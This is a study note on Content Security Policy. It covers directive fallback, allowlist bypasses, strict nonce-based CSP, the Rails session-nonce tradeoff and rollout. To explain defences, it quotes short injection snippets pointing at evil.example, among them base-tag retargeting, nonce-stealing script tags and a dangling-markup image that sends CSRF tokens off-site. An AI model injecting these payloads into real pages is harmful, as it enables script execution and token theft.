---
title: Content Security Policy
aliases:
- CSP
- strict CSP
- nonce-based CSP
- CSP nonce
tags:
- security
- web
- browser
created: '2026-10-23'
updated: '2026-10-23'
source_skill: study-walkthrough
flashcard_ids:
- cmne7xw3001u90msomnfve6jo
- cmne7xxvt029t0msogj8pet75
- cmvh4ho0w0003jq1a3jwnstmy
- cmne7xzvq02rh0msoh6nlzufz
- cmne7yekm06dr0mso1do4nilp
- cmne7y00302sf0mso7xre8ov6
- cmotwgr4i000eqs0mf7xai9j6
- cmnwwerrb000cfb0mufxjj4ok
- cmne7xw6s01v30msovqrbgfj3
- cmne7yej006db0msoxk3bi7i4
- cmowkcjfo0005rb0mzam5b1cn
- cmotwgt9j000fqs0mlndbc18s
- cmne7xzzt02sd0mso8oq3x114
- cmnwwesob000dfb0mzr99cij5
- cmqdhhwjw000g920m3j9xewob
- cmqdhhzim000h920manyyvmtv
- cmowkwfn7000brb0mkj8ky9r2
- cmowkwj7c000crb0mmzn3fei7
- cmqkr772h0004yb0mweyvp3j9
- cmqkr78xu0005yb0mcz8nk08i
- cmqkr7aoj0006yb0mslqjly12
- cmqkr7c6g0007yb0mhhuw37en
- cmvj7bk3i00000f1ay79xkf43
- cmvj7fs6b00010f1aqwc45bhv
- cmne7xx2y022v0mso8tysqhgq
- cmne7xwfd01x50msoyf2q0olt
- cmne7xwii01xv0mso1g3ja3xv
- cmne7xwgh01xf0mso5qaqk6cd
- cmne7xxh902670msovwgksyrm
- cmpre2fgd000gb20mk1bs7qt0
- cmne7xx7v02410msol21qjnib
---

# Content Security Policy

A response header that tells the browser which scripts, styles, images, frames and form targets the page may use. It is the second layer against [[security/xss]]. Escaping keeps the attacker's markup out, and CSP limits what that markup can do when escaping fails somewhere.

## TL;DR

- **CSP is enforced by the browser, per response.** The server sends the policy, and the browser checks every resource and inline script against it.
- **Allowlisting hosts mostly fails.** Any allowed host that serves JSONP, an old AngularJS or user uploads lets the attacker run code through it.
- **Use a strict CSP.** `script-src 'nonce-…' 'strict-dynamic'` trusts scripts by a per-response secret instead of by where they come from.
- **One nonce per response, shared by every trusted tag.** It has to be random, new for every response, and sent in the header.
- **Some directives have no fallback.** `base-uri`, `form-action` and `frame-ancestors` stay open unless you set them.
- **CSP does not stop HTML injection.** Defacement, fake forms and dangling markup need escaping and the non-script directives.

## How the Browser Decides

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example
```

For each request the browser picks the directive that governs it. A `<script src>` is checked against `script-src`. If `script-src` is missing, the browser falls back to `default-src`. If both are missing, scripts are unrestricted.

Inline code is the main target. Once `script-src` is set, every inline `<script>`, every `onclick="…"` handler and every `javascript:` URL is blocked. `'unsafe-inline'` re-allows all of them, which allows the attacker's injected `<img onerror=…>` too. A policy with `'unsafe-inline'` in `script-src` does little against XSS.

To allow one specific inline script, mark it instead of allowing all inline code.

- **Nonce.** The server puts `'nonce-r4nd0m'` in the policy and `nonce="r4nd0m"` on the tag. The browser runs the tag if the values match.
- **Hash.** The policy lists `'sha256-…'` of the exact script body. Any change to the script, even whitespace, breaks the match. Hashes suit static pages that cannot inject a value per response.

When a nonce or hash is present, the browser ignores `'unsafe-inline'`. Inline event handlers cannot carry a nonce. They need `'unsafe-hashes'` plus their hash, or better, a refactor to `addEventListener`.

## Why Allowlists Fail

```
script-src 'self' https://ajax.googleapis.com
```

This looks tight but trusts every file on that host. The attacker injects `<script src="https://ajax.googleapis.com/…/angular.js">` and then AngularJS template syntax, which the old framework evaluates as code. The same works with any JSONP endpoint, where `?callback=alert(1)` makes the host return script the attacker wrote. Under `'self'`, any user upload served from your own origin is a script source too.

Google's [CSP Is Dead](https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/) study looked at 26,011 distinct policies and found 94.72% of them bypassable. The conclusion was to stop trusting locations and start trusting scripts the server marked.

## Strict CSP

```
Content-Security-Policy:
  script-src 'nonce-r4nd0m' 'strict-dynamic';
  object-src 'none';
  base-uri 'none'
```

- **The nonce** decides which scripts in your HTML run.
- **`'strict-dynamic'`** passes that trust on. A script created with `createElement` and appended by a nonced script runs without a nonce of its own, so loaders and bundles keep working. It also makes the browser ignore host sources, scheme sources and `'self'`, so the allowlist bypasses above stop working.
- **`object-src 'none'`** blocks plugins like Flash, which could run script outside the policy.
- **`base-uri 'none'`** stops an injected `<base href="https://evil.example/">` from turning your own nonced `<script src="/app.js">` into a load from the attacker's host.

For older browsers, [web.dev](https://web.dev/articles/strict-csp) adds `https: 'unsafe-inline'` as a fallback. Browsers that understand nonces and `'strict-dynamic'` ignore both, and old ones get at least a weak policy.

## Nonces Done Right

The server makes **one random nonce per response** and writes it into the header and onto every script tag it means to run. All tags sharing one value is the intended design. The [CSP spec](https://w3c.github.io/webappsec-csp/#security-nonces) says the server "MUST generate a unique value each time it transmits a policy" with at least 128 bits from a secure random generator. Security comes from the attacker not knowing this response's value, not from every tag having its own.

Why an attacker cannot just copy the nonce:

1. **Timing.** A reflected or stored payload is fixed text written before the response exists. The victim's response gets a fresh nonce the payload cannot contain.
2. **Reading needs script.** Only running JavaScript could read the nonce from the DOM, and running JavaScript is what the attacker is trying to get.
3. **Nonce hiding.** With a header CSP, the browser blanks the `nonce` attribute after parsing. `getAttribute("nonce")` and CSS selectors like `script[nonce^="a"]` see an empty string, and only the `.nonce` property keeps the value. A `<meta>` CSP gets no hiding ([HTML spec](https://html.spec.whatwg.org/multipage/urls-and-fetching.html#nonce-attributes)).

The browser never sends a nonce. It compares the header against the tags, so the server stores nothing. That differs from form nonces for replay protection, which the server must remember and share across app servers.

### Rails and the Session Nonce

Rails' generated initializer has this commented-out line.

```ruby
# config.content_security_policy_nonce_generator = ->(request) { request.session.id.to_s }
```

That nonce stays the same for the whole session. DHH chose it in [PR #43227](https://github.com/rails/rails/pull/43227) because `Rack::ETag` hashes the response body, so a nonce that changes per request changes every ETag and no conditional GET ever returns `304`. The PR calls it "worth the slight security trade-off". It also suits Turbo Drive, which keeps the first page's CSP but swaps in each new page's nonce, so per-request nonces get Turbo's re-created scripts blocked ([turbo#294](https://github.com/hotwired/turbo/issues/294)).

The [Rails security guide](https://guides.rubyonrails.org/security.html#content-security-policy-header) still calls `SecureRandom.base64(16)` "a good default value". With the session id, anyone who sees one page of the session can reuse its nonce until the session ends. On the first request without a session, `request.session.id` is `nil` and the policy gets an empty `'nonce-'`.

## Where Nonces Break

- **Static or cached nonces.** A hardcoded nonce, or a CDN caching HTML with the nonce inside, lets the attacker read it from their own page load. A [2023 study](https://arxiv.org/abs/2309.07782) found 598 of 2,271 nonce-based sites reusing nonces across responses.
- **Hijacking the next tag.** An unclosed `<script src=//evil.example/x.js a="` right before a real `<script nonce=…>` can swallow the real tag so the nonce lands on the attacker's element. CSP Level 3 marks a script not nonceable when an attribute name or value contains `<script`, `<style` or `<link`. The spec lists that check as at risk, so treat it as partial.
- **Base retargeting.** A missing `base-uri` lets the attacker redirect your nonced relative scripts. Strict CSP sets it to `'none'`.
- **Script gadgets.** Libraries that turn harmless markup like `data-bind="…"` into code run the attacker's markup with the library's trust. `'strict-dynamic'` passes trust to scripts these libraries create.

## Directives Without Fallback

`default-src` covers fetches like scripts, styles, images, fonts and `connect-src`. It does not cover these, so each needs its own entry.

| Directive | What it stops | Typical value |
| --- | --- | --- |
| `base-uri` | injected `<base>` retargeting relative URLs | `'none'` or `'self'` |
| `form-action` | an injected fake login form posting to the attacker | `'self'` |
| `frame-ancestors` | clickjacking, other sites framing your page | `'none'` or `'self'` |

`frame-ancestors` replaces `X-Frame-Options` and can name specific origins, as in `frame-ancestors https://app.example.com`.

A policy in `<meta http-equiv="Content-Security-Policy">` cannot use `frame-ancestors`, `report-uri` or `sandbox`. It also has no Report-Only mode and applies only to content after the tag. Send the header when you can.

## What CSP Doesn't Stop

CSP governs what loads and runs. Injected plain HTML that runs nothing gets through.

- **Defacement.** `<h1>Site closed, call this number</h1>` is just markup. Only escaping fixes it.
- **Dangling markup.** An unclosed `<img src="https://evil.example/?` swallows the page text up to the next quote, CSRF tokens included, and sends it as a URL. `img-src` limits where that request can go.
- **Fake forms.** An injected login form is blocked from posting off-site only by `form-action`.

## Rolling It Out

Start with `Content-Security-Policy-Report-Only`. The browser reports violations to the `report-to` endpoint without blocking anything. Fix or nonce what the reports show, then switch to the enforcing header. Both headers can run at once, so a stricter policy can be tested next to the live one.

## Tradeoffs & Gotchas

- **Nonces versus caching.** Per-response nonces make full-page caching and ETags useless. Rails trades security for caching with its session nonce, while Google's guidance keeps per-response nonces and uses hashes for cached static pages. Contested.
- **`'unsafe-inline'` is often a leftover.** Teams add it to get inline handlers working and forget it. With a nonce present the browser ignores it, so it is harmless only on browsers that understand nonces.
- **Legacy inline handlers are the migration cost.** Every `onclick=` must move to `addEventListener` or be hashed with `'unsafe-hashes'`. Consensus that refactoring is worth it.
- **CSP pairs with Trusted Types.** `require-trusted-types-for 'script'` is a CSP directive that stops DOM-based XSS at the sink. See [[security/xss]].

## Related Concepts

- [[security/xss]]: CSP is the backup layer for when escaping misses a slot
- [[security/same-origin-policy]]: CSP restricts what your own origin may load, SOP restricts what other origins may read
- [[security/csrf]]: `form-action` and `frame-ancestors` limit fake forms and clickjacking, related cross-site tricks

## References

- [W3C Content Security Policy Level 3](https://w3c.github.io/webappsec-csp/): directives, nonce rules, `'strict-dynamic'`, the nonceable check
- [MDN Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy): directive reference, fallback rules, `<meta>` limits
- [web.dev Mitigate XSS with a strict CSP](https://web.dev/articles/strict-csp): the strict policy and its backwards-compatible form
- [Rails Security Guide, CSP header](https://guides.rubyonrails.org/security.html#content-security-policy-header): Rails DSL, nonce generator, the ETag tradeoff

**Practitioner / opinion:**

- [CSP Is Dead, Long Live CSP (Weichselbaum et al., CCS 2016)](https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/): the allowlist bypass study
